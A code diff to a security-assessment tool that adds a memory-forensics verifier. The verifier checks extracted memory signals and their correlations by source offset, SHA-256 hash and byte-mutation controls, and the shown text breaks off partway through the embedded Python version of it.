@@ -582,7 +582,9 @@ function buildProofArtifactRows(targetInfo, artifactDir) {
 	}
 	if (targetInfo.lane === "memory-forensics") {
 		add("memory-quicklook.json", "memory forensic quicklook/correlation output");
+		add("memory-evidence-verification.json", "memory signal/correlation offset verifier output");
 		add("memory-evidence-claims.json", "memory process/network/credential correlation claim ledger");
+		add("memory-evidence-verifier.py", "memory signal/correlation verification harness", 0o700);
 		add("memory-triage-plan.sh", "memory forensic triage harness", 0o700);
 	}
 	if (targetInfo.lane === "windows-ad") {
@@ -643,7 +645,7 @@ function buildProofCoverageGaps(targetInfo, artifactRows) {
 	if (targetInfo.lane === "crypto-stego") requireAny("crypto-transform-solver", ["crypto-stego-transform-claims.json", "crypto-stego-solver.py", "crypto-stego-media-quicklook.json"], "crypto/stego targets need a transform-chain verifier or media structure proof");
 	if (targetInfo.lane === "mobile" || targetInfo.lane === "mobile-ios") requireAny("mobile-runtime-hook", ["mobile-attack-surface-claims.json", "mobile-frida-hooks.js", "mobile-archive-summary.json"], "mobile targets need archive/runtime hook anchors");
 	if (targetInfo.lane === "firmware-iot") requireAny("firmware-extract-plan", ["firmware-attack-surface.json", "firmware-extraction-verification.json", "firmware-extraction-verifier.py", "firmware-extract-plan.sh", "firmware-quicklook.json"], "firmware targets need structure/extraction verifier anchors");
-	if (targetInfo.lane === "memory-forensics") requireAny("memory-triage-plan", ["memory-evidence-claims.json", "memory-triage-plan.sh", "memory-quicklook.json"], "memory targets need triage/correlation anchors");
+	if (targetInfo.lane === "memory-forensics") requireAny("memory-triage-plan", ["memory-evidence-claims.json", "memory-evidence-verification.json", "memory-evidence-verifier.py", "memory-triage-plan.sh", "memory-quicklook.json"], "memory targets need triage/correlation verifier anchors");
 	if (targetInfo.lane === "windows-ad") requireAny("windows-ad-triage-plan", ["windows-ad-triage-plan.sh", "windows-ad-quicklook.json"], "identity targets need AD graph/credential triage anchors");
 	if (targetInfo.lane === "malware") requireAny("malware-triage-plan", ["malware-behavior-claims.json", "malware-config-verification.json", "malware-config-verifier.py", "malware-triage-plan.sh", "malware-quicklook.json"], "malware targets need IOC/capability triage and verifier anchors");
 	if (targetInfo.lane === "agent-boundary") requireAny("agent-boundary-replay", ["agent-boundary-payloads.py", "agent-boundary-map.json"], "agent-boundary targets need replay payloads and flow map");
@@ -706,6 +708,7 @@ function buildProofLiveChecks(targetInfo, artifactDir, toolState) {
 			["pcap-http-object-verifier-pycompile", "pcap-http-object-verifier.py", "syntax-check PCAP object verifier"],
 			["crypto-stego-solver-pycompile", "crypto-stego-solver.py", "syntax-check crypto/stego solver harness"],
 			["agent-boundary-payloads-pycompile", "agent-boundary-payloads.py", "syntax-check agent boundary payload harness"],
+			["memory-evidence-verifier-pycompile", "memory-evidence-verifier.py", "syntax-check memory evidence verifier"],
 			["malware-config-verifier-pycompile", "malware-config-verifier.py", "syntax-check malware config verifier"],
 			["firmware-extraction-verifier-pycompile", "firmware-extraction-verifier.py", "syntax-check firmware extraction verifier"],
 		]) {
@@ -714,6 +717,8 @@ function buildProofLiveChecks(targetInfo, artifactDir, toolState) {
 		}
 		const agentBoundaryPayloads = proofArtifactPath(artifactDir, "agent-boundary-payloads.py");
 		if (existsSync(agentBoundaryPayloads)) add({ id: "agent-boundary-payloads-self-test", command: python, args: [agentBoundaryPayloads, "--self-test"], reason: "execute agent boundary replay harness self-test with unsafe/control payloads" });
+		const memoryVerifier = proofArtifactPath(artifactDir, "memory-evidence-verifier.py");
+		if (existsSync(memoryVerifier)) add({ id: "memory-evidence-verifier-self-test", command: python, args: [memoryVerifier, "--self-test"], reason: "execute memory evidence verifier self-test with offset/correlation negative controls" });
 		const malwareVerifier = proofArtifactPath(artifactDir, "malware-config-verifier.py");
 		if (existsSync(malwareVerifier)) add({ id: "malware-config-verifier-self-test", command: python, args: [malwareVerifier, "--self-test"], reason: "execute malware config verifier self-test with offset/hash negative controls" });
 		const firmwareVerifier = proofArtifactPath(artifactDir, "firmware-extraction-verifier.py");
@@ -910,6 +915,7 @@ const unifiedProofGraphArtifactCandidates = [
 	"crypto-stego-transform-claims.json",
 	"mobile-attack-surface-claims.json",
 	"pcap-flow-claims.json",
+	"memory-evidence-verification.json",
 	"memory-evidence-claims.json",
 	"windows-ad-attack-paths.json",
 	"malware-config-verification.json",
@@ -964,6 +970,7 @@ function proofGraphRepairRows(parsed) {
 function proofGraphRepairPriority(blocker) {
 	if (/missing-base-url|no-live-response|no-status|service|unreachable|endpoint/i.test(blocker)) return "high";
 	if (/missing-session|credential|authorization|cookie|token|principal/i.test(blocker)) return "high";
+	if (/missing-memory-(?:image-hash|signal-offset|process-network|credential-context|timeline|negative-control)/i.test(blocker)) return "high";
 	if (/missing-(?:ioc-offset|config-extraction|overlay-carve|sample-hash|import-parser|network-ioc-negative-control)/i.test(blocker)) return "high";
 	if (/missing-(?:firmware-image-hash|signature-offset|rootfs-carve|firmware-extraction-negative-control)|rootfs-carve-truncated/i.test(blocker)) return "high";
 	if (/no-differential|object-mutation|baseline|negative-control|oracle/i.test(blocker)) return "medium";
@@ -990,6 +997,12 @@ function proofGraphRepairAction(blocker) {
 		"missing-rootfs-carve-verifier": "Produce a rootfs carve with offset, bounded size, header/magic, and SHA-256.",
 		"rootfs-carve-truncated": "Acquire complete firmware/rootfs bytes or correct the requested carve size before full extraction claims.",
 		"missing-firmware-extraction-negative-control": "Add mutated image/offset controls so bad firmware offsets and bytes are rejected.",
+		"missing-memory-image-hash-verification": "Rerun memory-evidence-verifier.py against original bytes and require size/SHA-256 equality.",
+		"missing-memory-signal-offset-verification": "Bind memory signal rows to sourceOffset/valueSha256/valueLength and rerun the verifier.",
+		"missing-memory-process-network-verification": "Require source-bound command line and network offsets within the correlation window.",
+		"missing-memory-credential-context-verification": "Tie credential bytes to source-bound process, command line, network, or file offsets.",
+		"missing-memory-timeline-verification": "Bind timestamps to source-bound process/network offsets before claiming timeline proof.",
+		"missing-memory-negative-control": "Add memory byte mutation controls so altered evidence hashes are rejected.",
 	};
 	return actions[blocker] ?? "Drain this blocker by collecting source-bound runtime evidence and rerun the relevant harness.";
 }
@@ -8411,9 +8424,16 @@ function memorySignals(strings) {
 	const files = [];
 	const timestamps = [];
 	const addUnique = (list, value, offset) => {
-		const text = redact(String(value).slice(0, 300));
+		const raw = String(value ?? "");
+		const text = redact(raw.slice(0, 300));
 		if (!text || list.some((row) => row.text === text)) return;
-		list.push({ offset, text });
+		list.push({
+			offset,
+			sourceOffset: offset,
+			text,
+			valueSha256: bufferSha256(Buffer.from(raw)),
+			valueLength: Buffer.byteLength(raw),
+		});
 	};
 	for (const row of strings) {
 		const text = row.text;
@@ -8535,7 +8555,310 @@ function memoryQuicklookSummary(target) {
 	};
 }
 
-function memoryEvidenceClaims(summary) {
+function memorySignalRows(summary) {
+	const rows = [];
+	const signals = summary.stringScan?.signals ?? {};
+	for (const [kind, values] of Object.entries(signals)) {
+		if (!Array.isArray(values)) continue;
+		for (const row of values.slice(0, 120)) {
+			rows.push({
+				kind,
+				sourceOffset: row.sourceOffset ?? row.offset ?? null,
+				text: row.text ?? "",
+				valueSha256: row.valueSha256 ?? null,
+				valueLength: row.valueLength ?? null,
+			});
+		}
+	}
+	return rows;
+}
+
+function memoryVerifySignalRows(target, summary) {
+	const data = readFileSync(target);
+	const rows = [];
+	for (const row of memorySignalRows(summary)) {
+		const sourceOffset = Number(row.sourceOffset);
+		const valueLength = Number(row.valueLength);
+		const valueSha256 = row.valueSha256 ?? null;
+		let verified = false;
+		let reason = "missing-offset-hash-binding";
+		let actual = {};
+		let negativeControl = null;
+		if (Number.isFinite(sourceOffset) && Number.isFinite(valueLength) && valueLength > 0 && valueSha256) {
+			if (sourceOffset < 0 || sourceOffset + valueLength > data.length) {
+				reason = "signal-offset-out-of-range";
+			} else {
+				const chunk = data.subarray(sourceOffset, sourceOffset + valueLength);
+				actual = { sha256: bufferSha256(chunk), length: chunk.length };
+				verified = actual.sha256 === valueSha256 && actual.length === valueLength;
+				reason = verified ? "memory-signal-offset-hash-match" : "memory-signal-offset-hash-mismatch";
+				if (chunk.length) {
+					const mutated = Buffer.from(chunk);
+					mutated[0] ^= 0xff;
+					const mutatedSha256 = bufferSha256(mutated);
+					negativeControl = {
+						controlType: "memory-signal-byte-mutation-rejection",
+						mutatedSha256,
+						passed: mutatedSha256 !== valueSha256,
+					};
+				}
+			}
+		}
+		rows.push({
+			kind: row.kind,
+			sourceOffset: Number.isFinite(sourceOffset) ? sourceOffset : null,
+			redactedText: row.text,
+			valueSha256,
+			valueLength: Number.isFinite(valueLength) ? valueLength : null,
+			actual,
+			verified,
+			reason,
+			negativeControl,
+		});
+	}
+	return rows;
+}
+
+function memoryVerifiedOffset(signalChecks, kind, offset) {
+	return signalChecks.find((row) => row.kind === kind && row.sourceOffset === offset && row.verified) ?? null;
+}
+
+function memoryCorrelationVerificationRows(summary, signalChecks) {
+	const correlations = summary.correlations ?? {};
+	const rows = [];
+	for (const row of (correlations.processNetwork ?? []).slice(0, 40)) {
+		const cmdlineOffset = row.cmdline?.sourceOffset ?? row.cmdline?.offset ?? null;
+		const networkOffset = row.network?.sourceOffset ?? row.network?.offset ?? null;
+		const distance = Number.isFinite(Number(cmdlineOffset)) && Number.isFinite(Number(networkOffset)) ? Math.abs(Number(cmdlineOffset) - Number(networkOffset)) : null;
+		const cmdlineVerified = memoryVerifiedOffset(signalChecks, "cmdlines", cmdlineOffset);
+		const networkVerified = memoryVerifiedOffset(signalChecks, "network", networkOffset);
+		rows.push({
+			correlationType: "process-network",
+			cmdlineOffset,
+			networkOffset,
+			distance,
+			verified: Boolean(cmdlineVerified && networkVerified && distance != null && distance <= 512),
+			reason: cmdlineVerified && networkVerified ? (distance != null && distance <= 512 ? "process-network-distance-verified" : "process-network-distance-too-large") : "missing-source-offset-verification",
+		});
+	}
+	for (const row of (correlations.credentialContext ?? []).slice(0, 40)) {
+		const credentialOffset = row.credential?.sourceOffset ?? row.credential?.offset ?? null;
+		const cmdlineOffset = row.cmdline?.sourceOffset ?? row.cmdline?.offset ?? null;
+		const networkOffset = row.network?.sourceOffset ?? row.network?.offset ?? null;
+		const fileOffset = row.file?.sourceOffset ?? row.file?.offset ?? null;
+		const credentialVerified = memoryVerifiedOffset(signalChecks, "credentials", credentialOffset);
+		const cmdlineVerified = cmdlineOffset == null ? null : memoryVerifiedOffset(signalChecks, "cmdlines", cmdlineOffset);
+		const networkVerified = networkOffset == null ? null : memoryVerifiedOffset(signalChecks, "network", networkOffset);
+		const fileVerified = fileOffset == null ? null : memoryVerifiedOffset(signalChecks, "files", fileOffset);
+		const contextVerified = Boolean(cmdlineVerified || networkVerified || fileVerified);
+		rows.push({
+			correlationType: "credential-context",
+			credentialOffset,
+			cmdlineOffset,
+			networkOffset,
+			fileOffset,
+			verified: Boolean(credentialVerified && contextVerified),
+			reason: credentialVerified && contextVerified ? "credential-context-source-offsets-verified" : "missing-credential-context-source-offset-verification",
+		});
+	}
+	for (const row of (correlations.timeline ?? []).slice(0, 40)) {
+		const timestampOffset = row.timestamp?.sourceOffset ?? row.timestamp?.offset ?? null;
+		const cmdlineOffset = row.cmdline?.sourceOffset ?? row.cmdline?.offset ?? null;
+		const networkOffset = row.network?.sourceOffset ?? row.network?.offset ?? null;
+		const timestampVerified = memoryVerifiedOffset(signalChecks, "timestamps", timestampOffset);
+		const cmdlineVerified = cmdlineOffset == null ? null : memoryVerifiedOffset(signalChecks, "cmdlines", cmdlineOffset);
+		const networkVerified = networkOffset == null ? null : memoryVerifiedOffset(signalChecks, "network", networkOffset);
+		rows.push({
+			correlationType: "timeline",
+			timestampOffset,
+			cmdlineOffset,
+			networkOffset,
+			verified: Boolean(timestampVerified && (cmdlineVerified || networkVerified)),
+			reason: timestampVerified && (cmdlineVerified || networkVerified) ? "timeline-source-offsets-verified" : "missing-timeline-source-offset-verification",
+		});
+	}
+	return rows;
+}
+
+function memoryEvidenceVerificationClaims(summary, verificationRows) {
+	const claimLedger = [];
+	const composedPaths = [];
+	const addClaim = (claim) => claimLedger.push({ verdict: "promoted", confidence: 0.76, blockers: [], ...claim });
+	const verifiedSignals = verificationRows.signalChecks.filter((row) => row.verified);
+	const verifiedProcessNetwork = verificationRows.correlationChecks.filter((row) => row.verified && row.correlationType === "process-network");
+	const verifiedCredentialContext = verificationRows.correlationChecks.filter((row) => row.verified && row.correlationType === "credential-context");
+	const verifiedTimeline = verificationRows.correlationChecks.filter((row) => row.verified && row.correlationType === "timeline");
+	const passedControls = verificationRows.negativeControls.filter((row) => row.passed);
+	if (verificationRows.imageIdentity.verified) {
+		addClaim({
+			id: "memory-image-hash-verification-" + shortHash(verificationRows.imageIdentity.sha256),
+			claimType: "memory-image-hash-verification-proof",
+			sourceBinding: { artifact: "memory-evidence-verification.json" },
+			evidenceBinding: { size: verificationRows.imageIdentity.size, sha256: verificationRows.imageIdentity.sha256, osGuess: summary.osGuess },
+			statement: "Verifier re-read the memory image and matched size/SHA-256 against quicklook identity.",
+			confidence: 0.9,
+			rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
+		});
+	}
+	if (verifiedSignals.length) {
+		addClaim({
+			id: "memory-signal-offset-verification-" + shortHash(verifiedSignals.map((row) => `${row.kind}:${row.sourceOffset}:${row.valueSha256}`).join("|")),
+			claimType: "memory-signal-offset-verification-proof",
+			sourceBinding: { artifact: "memory-evidence-verification.json", offsets: verifiedSignals.slice(0, 48).map((row) => ({ kind: row.kind, sourceOffset: row.sourceOffset })) },
+			evidenceBinding: { verifiedCount: verifiedSignals.length, kinds: Array.from(new Set(verifiedSignals.map((row) => row.kind))).sort() },
+			statement: "Verifier bound memory signal rows to exact source offsets and raw-value hashes without exposing secret material.",
+			confidence: 0.86,
+			rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
+		});
+	}
+	if (verifiedProcessNetwork.length) {
+		addClaim({
+			id: "memory-process-network-verification-" + shortHash(verifiedProcessNetwork.map((row) => `${row.cmdlineOffset}:${row.networkOffset}`).join("|")),
+			claimType: "memory-process-network-verification-proof",
+			sourceBinding: { artifact: "memory-evidence-verification.json", rows: verifiedProcessNetwork.map((row) => ({ cmdlineOffset: row.cmdlineOffset, networkOffset: row.networkOffset, distance: row.distance })) },
+			evidenceBinding: { verifiedCount: verifiedProcessNetwork.length },
+			statement: "Verifier confirmed process/network correlations using source-bound command line and endpoint offsets within the correlation window.",
+			confidence: 0.86,
+			rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
+		});
+	}
+	if (verifiedCredentialContext.length) {
+		addClaim({
+			id: "memory-credential-context-verification-" + shortHash(verifiedCredentialContext.map((row) => `${row.credentialOffset}:${row.cmdlineOffset}:${row.networkOffset}:${row.fileOffset}`).join("|")),
+			claimType: "memory-credential-context-verification-proof",
+			sourceBinding: { artifact: "memory-evidence-verification.json", rows: verifiedCredentialContext.map((row) => ({ credentialOffset: row.credentialOffset, cmdlineOffset: row.cmdlineOffset, networkOffset: row.networkOffset, fileOffset: row.fileOffset })) },
+			evidenceBinding: { verifiedCount: verifiedCredentialContext.length },
+			statement: "Verifier confirmed credential context by requiring source-bound credential bytes plus a nearby process, network, or file anchor.",
+			confidence: 0.86,
+			rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
+		});
+	}
+	if (verifiedTimeline.length) {
+		addClaim({
+			id: "memory-timeline-verification-" + shortHash(verifiedTimeline.map((row) => `${row.timestampOffset}:${row.cmdlineOffset}:${row.networkOffset}`).join("|")),
+			claimType: "memory-timeline-verification-proof",
+			sourceBinding: { artifact: "memory-evidence-verification.json", rows: verifiedTimeline.map((row) => ({ timestampOffset: row.timestampOffset, cmdlineOffset: row.cmdlineOffset, networkOffset: row.networkOffset })) },
+			evidenceBinding: { verifiedCount: verifiedTimeline.length },
+			statement: "Verifier confirmed timestamped memory pivots are tied to source-bound process or network evidence.",
+			confidence: 0.8,
+			rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
+		});
+	}
+	if (passedControls.length) {
+		addClaim({
+			id: "memory-verifier-negative-control-" + shortHash(passedControls.map((row) => `${row.controlType}:${row.mutatedSha256}`).join("|")),
+			claimType: "memory-verifier-negative-control-proof",
+			sourceBinding: { artifact: "memory-evidence-verification.json" },
+			evidenceBinding: { passedControls },
+			statement: "Verifier ran mutation controls proving altered source bytes do not keep the original memory evidence hash.",
+			confidence: 0.84,
+			rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
+		});
+	}
+	const imageClaim = claimLedger.find((claim) => claim.claimType === "memory-image-hash-verification-proof");
+	const signalClaim = claimLedger.find((claim) => claim.claimType === "memory-signal-offset-verification-proof");
+	const processNetworkClaim = claimLedger.find((claim) => claim.claimType === "memory-process-network-verification-proof");
+	const credentialClaim = claimLedger.find((claim) => claim.claimType === "memory-credential-context-verification-proof");
+	const timelineClaim = claimLedger.find((claim) => claim.claimType === "memory-timeline-verification-proof");
+	const controlClaim = claimLedger.find((claim) => claim.claimType === "memory-verifier-negative-control-proof");
+	if (imageClaim && signalClaim && credentialClaim && (processNetworkClaim || timelineClaim) && controlClaim) {
+		const segments = [imageClaim, signalClaim, credentialClaim, processNetworkClaim, timelineClaim, controlClaim].filter(Boolean);
+		const composed = {
+			id: "memory-forensic-proof-path-" + shortHash(segments.map((claim) => claim.id).join(">")),
+			claimType: "memory-forensic-proof-path",
+			sourceBinding: { segments: segments.map((claim) => ({ id: claim.id, claimType: claim.claimType, artifact: claim.sourceBinding?.artifact })) },
+			evidenceBinding: {
+				imageSha256: verificationRows.imageIdentity.sha256,
+				hasCredentialContext: Boolean(credentialClaim),
+				hasProcessNetwork: Boolean(processNetworkClaim),
+				hasTimeline: Boolean(timelineClaim),
+				hasNegativeControl: Boolean(controlClaim),
+			},
+			statement: "Memory verification composes image identity, signal offsets, credential/process/network or timeline correlations, and mutation controls into a rerunnable forensic proof path.",
+			verdict: "promoted",
+			confidence: processNetworkClaim && timelineClaim ? 0.9 : 0.84,
+			blockers: [],
+			rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
+		};
+		claimLedger.push(composed);
+		composedPaths.push(composed);
+	}
+	return { claimLedger, composedPaths };
+}
+
+function memoryEvidenceVerificationSummary(target, summary) {
+	const data = readFileSync(target);
+	const imageIdentity = {
+		size: data.length,
+		sha256: bufferSha256(data),
+		verified: data.length === summary.size && bufferSha256(data) === summary.sha256,
+	};
+	if (data.length) {
+		const mutated = Buffer.from(data);
+		mutated[0] ^= 0xff;
+		const mutatedSha256 = bufferSha256(mutated);
+		imageIdentity.negativeControl = {
+			controlType: "memory-image-byte-mutation-rejection",
+			mutatedSha256,
+			passed: mutatedSha256 !== summary.sha256,
+		};
+	}
+	const signalChecks = memoryVerifySignalRows(target, summary);
+	const correlationChecks = memoryCorrelationVerificationRows(summary, signalChecks);
+	const negativeControls = [imageIdentity.negativeControl, ...signalChecks.map((row) => row.negativeControl)].filter((row) => row?.passed);
+	const claims = memoryEvidenceVerificationClaims(summary, { imageIdentity, signalChecks, correlationChecks, negativeControls });
+	const verifiedSignals = signalChecks.filter((row) => row.verified);
+	const verifiedProcessNetwork = correlationChecks.filter((row) => row.verified && row.correlationType === "process-network");
+	const verifiedCredentialContext = correlationChecks.filter((row) => row.verified && row.correlationType === "credential-context");
+	const verifiedTimeline = correlationChecks.filter((row) => row.verified && row.correlationType === "timeline");
+	const blockers = [];
+	if (!imageIdentity.verified) blockers.push("missing-memory-image-hash-verification");
+	if (!verifiedSignals.length) blockers.push("missing-memory-signal-offset-verification");
+	if ((summary.correlations?.processNetwork ?? []).length && !verifiedProcessNetwork.length) blockers.push("missing-memory-process-network-verification");
+	if ((summary.correlations?.credentialContext ?? []).length && !verifiedCredentialContext.length) blockers.push("missing-memory-credential-context-verification");
+	if ((summary.correlations?.timeline ?? []).length && !verifiedTimeline.length) blockers.push("missing-memory-timeline-verification");
+	if (!negativeControls.length) blockers.push("missing-memory-negative-control");
+	const repairActions = {
+		"missing-memory-image-hash-verification": "Rerun memory-evidence-verifier.py against original bytes and require size/SHA-256 equality.",
+		"missing-memory-signal-offset-verification": "Bind memory signal rows to sourceOffset/valueSha256/valueLength and rerun the verifier.",
+		"missing-memory-process-network-verification": "Require command line and network endpoint offsets to be source-bound and within the correlation window.",
+		"missing-memory-credential-context-verification": "Tie credential bytes to source-bound process, command line, network, or file offsets before promotion.",
+		"missing-memory-timeline-verification": "Bind timestamp rows to source-bound process/network evidence before claiming timeline proof.",
+		"missing-memory-negative-control": "Add byte mutation controls so altered memory evidence is rejected by hash.",
+	};
+	const repairQueue = blockers.map((blocker) => ({
+		id: "memory-evidence-verification-" + blocker,
+		blocker,
+		action: repairActions[blocker] ?? "Collect verifier-bound memory evidence and rerun memory-evidence-verifier.py.",
+		rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
+	}));
+	const promotedClaims = claims.claimLedger.filter((claim) => claim.verdict === "promoted");
+	return {
+		kind: "repi-memory-evidence-verification",
+		schemaVersion: 1,
+		generatedAt: new Date().toISOString(),
+		target: redact(target),
+		proofReady: promotedClaims.length > 0,
+		imageIdentity,
+		signalChecks,
+		correlationChecks,
+		negativeControls,
+		stats: {
+			signalsVerified: verifiedSignals.length,
+			processNetworkVerified: verifiedProcessNetwork.length,
+			credentialContextVerified: verifiedCredentialContext.length,
+			timelineVerified: verifiedTimeline.length,
+			negativeControlsPassed: negativeControls.length,
+		},
+		claimLedger: claims.claimLedger,
+		composedPaths: claims.composedPaths,
+		promotionReport: { proofReady: promotedClaims.length > 0, promotedClaims, blockers },
+		repairQueue,
+	};
+}
+
+
+function memoryEvidenceClaims(summary, verification) {
 	const signals = summary.stringScan?.signals ?? {};
 	const correlations = summary.correlations ?? {};
 	const claimLedger = [];
@@ -8648,14 +8971,44 @@ function memoryEvidenceClaims(summary) {
 			rerunCommand: "cat memory-quicklook.json | jq '.correlations.timeline'",
 		});
 	}
+	for (const claim of verification?.claimLedger ?? []) {
+		if (claim.verdict !== "promoted") continue;
+		addClaim({
+			...claim,
+			id: claim.id || "memory-verification-claim-" + shortHash(JSON.stringify(claim)),
+			sourceBinding: {
+				artifact: "memory-evidence-verification.json",
+				...(claim.sourceBinding ?? {}),
+			},
+			rerunCommand: claim.rerunCommand ?? "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
+		});
+	}
 	const promotedClaims = claimLedger.filter((claim) => claim.verdict === "promoted");
 	const credentialClaim = promotedClaims.find((claim) => claim.claimType === "memory-credential-context");
 	const processNetworkClaim = promotedClaims.find((claim) => claim.claimType === "memory-process-network-correlation");
 	const timelineClaim = promotedClaims.find((claim) => claim.claimType === "memory-timeline-correlation");
 	const highValueClaim = promotedClaims.find((claim) => claim.claimType === "memory-high-value-process");
+	const verifierCredentialClaim = promotedClaims.find((claim) => claim.claimType === "memory-credential-context-verification-proof");
+	const verifierProcessNetworkClaim = promotedClaims.find((claim) => claim.claimType === "memory-process-network-verification-proof");
+	const verifierTimelineClaim = promotedClaims.find((claim) => claim.claimType === "memory-timeline-verification-proof");
+	const verifierNegativeControlClaim = promotedClaims.find((claim) => claim.claimType === "memory-verifier-negative-control-proof");
 	const composedPaths = [];
+	for (const path of verification?.composedPaths ?? []) {
+		const composed = {
+			...path,
+			id: path.id || "memory-verification-path-" + shortHash(JSON.stringify(path)),
+			sourceBinding: {
+				artifact: "memory-evidence-verification.json",
+				...(path.sourceBinding ?? {}),
+			},
+			rerunCommand: path.rerunCommand ?? "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
+		};
+		claimLedger.push(composed);
+		promotedClaims.push(composed);
+		composedPaths.push(composed);
+	}
 	if (credentialClaim && (processNetworkClaim || highValueClaim)) {
-		const segments = [credentialClaim, processNetworkClaim, timelineClaim, highValueClaim].filter(Boolean);
+		const segments = [credentialClaim, verifierCredentialClaim, processNetworkClaim, verifierProcessNetworkClaim, timelineClaim, verifierTimelineClaim, highValueClaim, verifierNegativeControlClaim].filter(Boolean);
 		const composed = {
 			id: "memory-credential-network-pivot-" + shortHash(segments.map((claim) => claim.id).join(">")),
 			claimType: "memory-credential-network-pivot",
@@ -8672,10 +9025,14 @@ function memoryEvidenceClaims(summary) {
 				hasProcessNetwork: Boolean(processNetworkClaim),
 				hasTimeline: Boolean(timelineClaim),
 				hasHighValueProcess: Boolean(highValueClaim),
+				hasVerifierCredentialContext: Boolean(verifierCredentialClaim),
+				hasVerifierProcessNetwork: Boolean(verifierProcessNetworkClaim),
+				hasVerifierTimeline: Boolean(verifierTimelineClaim),
+				hasNegativeControl: Boolean(verifierNegativeControlClaim),
 			},
-			statement: "Memory correlations compose credential material with process/network context into a concrete investigation pivot.",
+			statement: "Memory correlations compose credential material with process/network context, timestamp evidence, source-offset verification, and mutation controls into a concrete investigation pivot.",
 			verdict: "promoted",
-			confidence: processNetworkClaim && timelineClaim ? 0.86 : 0.8,
+			confidence: verifierNegativeControlClaim && verifierCredentialClaim ? 0.9 : processNetworkClaim && timelineClaim ? 0.86 : 0.8,
 			blockers: [],
 			rerunCommand: "cat memory-evidence-claims.json | jq '.composedPaths'",
 		};
@@ -8689,24 +9046,36 @@ function memoryEvidenceClaims(summary) {
 	if (!credentialClaim) blockers.push("missing-credential-context");
 	if (!timelineClaim) blockers.push("missing-timeline-correlation");
 	if (!highValueClaim) blockers.push("missing-high-value-process");
+	for (const blocker of verification?.promotionReport?.blockers ?? []) {
+		if (!blockers.includes(blocker)) blockers.push(blocker);
+	}
 	const repairActions = {
 		"missing-os-profile": "Run volatility info/banner plugins or collect OS strings until the memory profile is anchored.",
 		"missing-process-network-correlation": "Correlate netscan/socket endpoints with command lines or process names before claiming network activity.",
 		"missing-credential-context": "Tie credential strings to nearby process, file, registry, command line, or network offsets.",
 		"missing-timeline-correlation": "Extract timestamped rows and bind them to process/network context for ordering.",
 		"missing-high-value-process": "Collect process listings or strings for credential-bearing/high-value processes such as lsass or sshd.",
+		"missing-memory-image-hash-verification": "Rerun memory-evidence-verifier.py against original bytes and require size/SHA-256 equality.",
+		"missing-memory-signal-offset-verification": "Bind every promoted memory signal to sourceOffset/valueSha256/valueLength.",
+		"missing-memory-process-network-verification": "Require commandline and network endpoint offsets to be source-bound and within the correlation window.",
+		"missing-memory-credential-context-verification": "Tie credential bytes to source-bound process, commandline, network, or file evidence before promotion.",
+		"missing-memory-timeline-verification": "Bind timestamp rows to source-bound process/network evidence before claiming a timeline proof.",
+		"missing-memory-negative-control": "Add byte mutation controls so altered memory evidence is rejected by hash.",
 	};
 	const repairQueue = blockers.map((blocker) => ({
 		id: "memory-evidence-" + blocker,
 		blocker,
 		action: repairActions[blocker] ?? "Collect source-bound memory evidence and rerun evidence claim promotion.",
-		rerunCommand: "repi engage <memory-image> --json",
+		rerunCommand: /^missing-memory-/.test(blocker)
+			? "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json"
+			: "repi engage <memory-image> --json",
 	}));
 	return {
 		kind: "repi-memory-evidence-claims",
-		schemaVersion: 1,
+		schemaVersion: 2,
 		generatedAt: new Date().toISOString(),
 		proofReady: promotedClaims.length > 0,
+		verificationStats: verification?.stats ?? null,
 		claimLedger,
 		composedPaths,
 		promotionReport: {
@@ -8717,6 +9086,178 @@ function memoryEvidenceClaims(summary) {
 		repairQueue,
 	};
 }
+
+function memoryEvidenceVerifierSource() {
+	return String.raw`#!/usr/bin/env python3
+import argparse
+import hashlib
+import json
+import os
+import tempfile
+
+
+def sha256(data):
+    return hashlib.sha256(data).hexdigest()
+
+
+def signal_rows(summary):
+    out = []
+    for kind, values in (summary.get("stringScan", {}).get("signals") or {}).items():
+        if not isinstance(values, list):
+            continue
+        for row in values[:120]:
+            out.append({"kind": kind, "sourceOffset": row.get("sourceOffset", row.get("offset")), "text": row.get("text", ""), "valueSha256": row.get("valueSha256"), "valueLength": row.get("valueLength")})
+    return out
+
+
+def verify_signal_rows(data, summary):
+    rows = []
+    for row in signal_rows(summary):
+        try:
+            offset = int(row.get("sourceOffset"))
+            length = int(row.get("valueLength"))
+        except Exception:
+            offset = -1
+            length = -1
+        expected = row.get("valueSha256")
+        actual = {}
+        verified = False
+        reason = "missing-offset-hash-binding"
+        control = None
+        if offset >= 0 and length > 0 and expected:
+            if offset + length > len(data):
+                reason = "signal-offset-out-of-range"
+            else:
+                chunk = data[offset:offset + length]
+                actual = {"sha256": sha256(chunk), "length": len(chunk)}
+                verified = actual["sha256"] == expected and actual["length"] == length
+                reason = "memory-signal-offset-hash-match" if verified else "memory-signal-offset-hash-mismatch"
+                if chunk:
+                    mutated = bytearray(chunk)
+                    mutated[0] ^= 0xFF
+                    mutated_sha = sha256(bytes(mutated))
+                    control = {"controlType": "memory-signal-byte-mutation-rejection", "mutatedSha256": mutated_sha, "passed": mutated_sha != expected}
+        rows.append({"kind": row.get("kind"), "sourceOffset": offset if offset >= 0 else None, "redactedText": row.get("text"), "valueSha256": expected, "valueLength": length if length > 0 else None, "actual": actual, "verified": verified, "reason": reason, "negativeControl": control})
+    return rows
+
+
+def verified_offset(checks, kind, offset):
+    return next((row for row in checks if row.get("kind") == kind and row.get("sourceOffset") == offset and row.get("verified")), None)
+
+
+def correlation_rows(summary, checks):
+    rows = []
+    cor = summary.get("correlations") or {}
+    for row in (cor.get("processNetwork") or [])[:40]:
+        cmd = (row.get("cmdline") or {}).get("sourceOffset", (row.get("cmdline") or {}).get("offset"))
